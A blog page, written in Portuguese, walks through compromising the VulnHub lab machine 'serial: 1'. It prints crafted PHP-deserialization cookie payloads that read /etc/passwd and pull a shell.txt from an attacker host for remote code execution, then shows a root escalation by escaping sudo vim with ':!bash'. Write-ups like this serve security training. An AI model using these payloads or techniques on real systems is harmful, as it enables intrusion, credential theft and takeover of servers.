@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="pt-br">
+	<head>
+		
+<title>VulnHub serial: 1 - Anderson Gomes</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/assets/favicons/favicon.ico">
+
+<link rel="stylesheet" href="/assets/bulma/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="/assets/fontawesome-free-6.5.1-web/css/all.css">
+
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+
+<meta name="keywords" content="Anderson Gomes">
+<meta name="description" content="">
+
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+	<body>
+		<div id="home-hidden"></div>
+		<nav class="navbar is-fixed-top has-text-centered" role="navigation" aria-label="main navigation" style="background-color: #19193b;">
+	<div class="container">
+		<div class="navbar-brand">
+			<a class="navbar-item logo" target="_blank" rel="noopener" href="https://andersongomes.dev.br">
+				<img src="/assets/images/logo_anderson.png" width="112" height="28">
+			</a>
+			<a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false"
+				data-target="navbarBasicExample">
+				<span aria-hidden="true"></span>
+				<span aria-hidden="true"></span>
+				<span aria-hidden="true"></span>
+			</a>
+		</div>
+
+		<div id="navbarBasicExample" class="navbar-menu">
+			<div class="navbar-start">
+				
+					</for>
+					<a class="navbar-item navbar-item-hover" href="/">
+						HOME
+					</a>
+					
+					</for>
+					<a class="navbar-item navbar-item-hover" href="/about">
+						ABOUT
+					</a>
+					
+			</div>
+
+			<div class="navbar-end">
+				<div class="navbar-item">
+					<div class="buttons">
+						<a class="button navbar-item-social" target="_blank" rel="noopener" href="https://www.youtube.com/@andersonDev_">
+							<i class="fa-brands fa-youtube fa-2xl"></i>
+						</a>
+						<a class="button navbar-item-social" target="_blank" rel="noopener" href="https://www.linkedin.com/in/devanderson">
+							<i class="fa-brands fa-linkedin fa-2xl"></i>
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</nav> 
+
+<div class="container container-100vh">
+  <div class="columns">
+    <div class="column is-8 is-offset-2 has-text-centered">
+      <!--figure class="image is-16by9"-->
+      <figure class="image">
+        <img src="https://cdn-images-1.medium.com/max/800/1*E0oIubshtbc73STQvJvVVA.png" alt="">
+        <figcaption></figcaption>
+      </figure>
+    </div>
+  </div>
+  <section class="articles">
+    <div class="column is-8 is-offset-2">
+      <div class="card article background-color-principal">
+        <div class="card-content">
+          <div class="media">
+            <div class="media-content has-text-centered">
+              <p class="title article-title">VulnHub serial: 1</p>
+              <p class="subtitle is-4 article-subtitle is-pulled-left">
+                Escrito por Anderson Gomes em 22/08/2019
+              </p>
+              
+              <!--div class="control"><span class="tag is-info is-uppercase">story</span></div-->
+            </div>
+          </div>
+          <div class="content article-body"><h1 id="VulnHub-serial-1"><a href="#VulnHub-serial-1" class="headerlink" title="VulnHub serial: 1"></a>VulnHub serial: 1</h1><p>Alvo: serial: 1 (Linux) Atacante: parrot 4.19</p>
+<hr>
+<h3 id="VulnHub-serial-1-1"><a href="#VulnHub-serial-1-1" class="headerlink" title="VulnHub serial: 1"></a><a target="_blank" rel="noopener" href="https://medium.com/me/stats/post/9ec5d8547c0?source=main_stats_page">VulnHub</a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/serial-1,349/"><strong>serial: 1</strong></a></h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/serial-1,349/" title="https://www.vulnhub.com/entry/serial-1,349/"><strong>serial: 1</strong><br>_serial: 1, made by sk4. Download &amp; walkthrough links are available._www.vulnhub.com</a><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/serial-1,349/"></a></p>
+<blockquote>
+<p><em>Alvo:</em> <strong>serial: 1 (Linux)</strong><em>Atacante:</em> <strong>parrot</strong> 4.19</p>
+</blockquote>
+<h3 id="Informacoes-sobre-o-Alvo"><a href="#Informacoes-sobre-o-Alvo" class="headerlink" title="Informações sobre o Alvo."></a>Informações sobre o Alvo.</h3><p>Nenhuma informação sobre o alvo.</p>
+<h3 id="Reconhecimento-Enumeracao"><a href="#Reconhecimento-Enumeracao" class="headerlink" title="Reconhecimento &#x2F; Enumeração."></a>Reconhecimento &#x2F; Enumeração.</h3><p>Descobrindo portas abertas no alvo.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*E0oIubshtbc73STQvJvVVA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>nmap</p>
+<p>Logo depois do nmap fazer a varredura no alvo percebemos que existe duas portas abertas um rodando servidor ssh e outra rodando apache.<br>Em seguida fazemos uma varredura no servido web em busca de alguma brecha.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*ODfuxGEJggU5M4sUuT5ZPQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>nikto</p>
+<p>Ao terminar a varredura encontramos uma pasta backup com um arquivo zip.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*EBBofWkmuG0cccEMni0ZrQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>bak.zip</p>
+<p>Logo depois de baixar o zip e descompactar, notamos que existe alguns scripts em php.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*OK7PvAwujCzPB2UwJtDu_w.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>lista de arquivos.</p>
+<p>Agora vamos fazer uma verificação nos script e verificar se existe alguma brecha.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*NMBwaqW0wBphYl1Mnw90aA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>index.php</p>
+<p>No index.php notamos que o cookies é serializado e depois cifrando em base64, logo abaixo existe uma função (unserialize) que aparentemente esta vulnerável.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*9Oo_9P6ntqCns5jsC8DPUg.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Classe User e Welcome.</p>
+<p>Nas classes <strong>User</strong> e <strong>Welcome</strong> não há nada que possa ser aproveitado.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*WZFTDR-fbe_l8cLq4OZiSg.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Classe Log.</p>
+<p>Na classe <strong>Log</strong> tem um “include” que esta vulnerável.<br>Antes vamos ver o que vem no cookie ao acessar o servidor.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*0Qw4PkhuhUdIKNZKaTRCNA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>requisição no servidor.</p>
+<p><strong>base64 codificado.</strong></p>
+<blockquote>
+<p>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0&#x3D;</p>
+</blockquote>
+<p><strong>base64 decodificado.</strong></p>
+<blockquote>
+<p>O:4:”User”:2:{s:10:”Username”;s:3:”sk4”;s:9:”Userwel”;O:7:”Welcome”:0:{}}</p>
+</blockquote>
+<p>Agora vamos criar nosso payload para teste.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*H8lD21pGTzcNqmZKRI5YUg.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Classe Log modificada.</p>
+<p>Vamos fazer a classe <strong>Log</strong> ler o <strong>passwd</strong> do servidor.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*yiZLUMygL0tINDcLery-8w.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Chamando a classe <strong>Log</strong> no lugar da <strong>Welcome</strong>, e gerando o payload.</p>
+<p><strong>base64 codificado.</strong></p>
+<blockquote>
+<p>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjc6IkhBQ0tFUiAiO3M6OToiAFVzZXIAd2VsIjtPOjM6IkxvZyI6MTp7czoxMzoiAExvZwB0eXBlX2xvZyI7czoxMToiL2V0Yy9wYXNzd2QiO319</p>
+</blockquote>
+<p><strong>base64 decodificado.</strong></p>
+<blockquote>
+<p>O:4:”User”:2:{s:10:”Username”;s:7:”HACKER “;s:9:”Userwel”;O:3:”Log”:1:{s:13:”Logtype_log”;s:11:”&#x2F;etc&#x2F;passwd”;}}</p>
+</blockquote>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*ONady6B01Di8uF_hps_zRQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Burp</p>
+<p>O resultado é a leitura do arquivo passwd.<br>Vamos criar uma shell para executar alguns comando.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*xVDLNcggZw89CO59xr4CwQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>shell.txt</p>
+<p>Observe que a extensão do arquivo é .txt</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*evfTBCCc9UgfqDD7pVEIZw.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>alterando a classe Log.</p>
+<p>Alterando a classe <strong>Log</strong> para pegar o arquivo shell.txt e gerando um novo payload gerado:</p>
+<p><strong>base64 codificado.</strong></p>
+<blockquote>
+<p>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjc6IkhBQ0tFUiAiO3M6OToiAFVzZXIAd2VsIjtPOjM6IkxvZyI6MTp7czoxMzoiAExvZwB0eXBlX2xvZyI7czozMzoiaHR0cDovLzE5Mi4xNjguMS43OjkwOTAvc2hlbGwudHh0Ijt9fQ&#x3D;&#x3D;</p>
+</blockquote>
+<p><strong>base64 decodificado.</strong></p>
+<blockquote>
+<p>O:4:”User”:2:{s:10:”Username”;s:7:”HACKER “;s:9:”Userwel”;O:3:”Log”:1:{s:13:”Logtype_log”;s:33:”<a target="_blank" rel="noopener" href="http://192.168.1.7:9090/shell.txt">http://192.168.1.7:9090/shell.txt</a>“;}}</p>
+</blockquote>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*aYRW6s24NtrqweVk-po0Ug.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>executando comando “id”.</p>
+<p>Nosso comando funciona perfeitamente.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*4bm1aeuNTf4us81FeVTBpA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>credentials.txt.bak</p>
+<p>Listando os arquivo da raiz do servidor, encontramos um arquivo com o nome de “credentials” tudo indica ser uma senha.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*T4Wjz4-2Nne4JG4Tq9gxkA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Conseguindo a senha.</p>
+<p>Obtemos a nossa senha.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*rf3Sm8Q631g_2vlWAltIhQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Primeira flag.</p>
+<p>Ganhamos acesso ao servidor, e obtemos a primeira flag.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*JFz4iyo8FwZszpLwiJhtWA.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Ganhando acesso.</p>
+<p>Temos como executar o VIM como super usuário, e para escapar para é só pressionar ESC e digitar e digitar “:!bash”.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*ypWcrTQGXIbYny1WgXGvAQ.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Ganhamos acesso root.</p>
+<figure class="image">
+      <img src="https://cdn-images-1.medium.com/max/800/1*kSeR-khp2aPb5yEaBiD-dw.png" alt="">
+      <figcaption></figcaption>
+    </figure>
+
+<p>Acesso root.</p>
+<p>Até a próxima.</p>
+</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+<div class="container">
+  <nav class="pagination is-centered" role="navigation" aria-label="pagination">
+    <div class="column is-6 is-offset-3">
+      
+      <a
+        class="button bd-fat-button is-info is-light bd-pagination-prev artigo-button"
+        href="/2019/08/30/VulnHub-dpwwn-1/"
+        title="Artigo Anterior"
+      >
+        <strong><i class="fa fa-arrow-left"></i> Artigo Anterior</strong>
+      </a>
+       
+      <a
+        class="button bd-fat-button is-info is-light bd-pagination-prev artigo-button"
+        href="/2019/08/10/VulnHub-Tr0ll-3/"
+        title="Próximo Artigo"
+      >
+        <strong>Próximo Artigo <i class="fa fa-arrow-right"></i></strong>
+      </a>
+      
+    </div>
+  </nav>
+</div>
+
+<!--% partial('_partial/post_paging') %-->
+
+		<a id="toTop" class="button" style="display: block;" href="#home-hidden">
+  <span class="icon is-large">
+      <i class="fas fa-arrow-up"></i>
+  </span>
+</a>
+
+<footer class="section footer_section">
+  <div class="container">
+    <div class="content has-text-centered">
+      <p>
+        <strong
+          >© 2023-2024 Desenvolvido por
+          <a target="_blank" rel="noopener" href="https://andersongomes.dev.br">Anderson Gomes</a>.</strong
+        >
+      </p>
+    </div>
+  </div>
+</footer>
+
+<script src="/assets/js/bulma.js"></script>
+
+
+	</body>
+</html>
+
